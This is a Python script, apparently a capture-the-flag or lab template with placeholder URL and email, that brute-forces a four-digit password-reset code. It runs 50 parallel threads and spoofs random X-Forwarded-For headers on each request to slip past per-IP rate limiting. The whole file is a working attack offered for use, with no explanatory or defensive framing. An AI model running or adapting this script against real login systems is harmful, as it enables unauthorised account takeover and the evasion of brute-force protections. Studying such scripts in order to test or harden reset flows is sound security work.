#!/usr/bin/env python3

import requests
import random
import threading

url = "<reset-password-url>"
stop_flag = threading.Event()
num_threads = 50


def brute_force_code(session, start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
                },
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            else:
                if "<error for invalid code>" not in r.text:
                    stop_flag.set()
                    print(f"[+] Found the recovery code: {code_str}")
                    print("[+] Printing the response: ")
                    print(r.text)
                    return
        except Exception as e:
            #print(e)
            pass


def main():
    session = requests.Session()
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "<email>"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(session, start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()


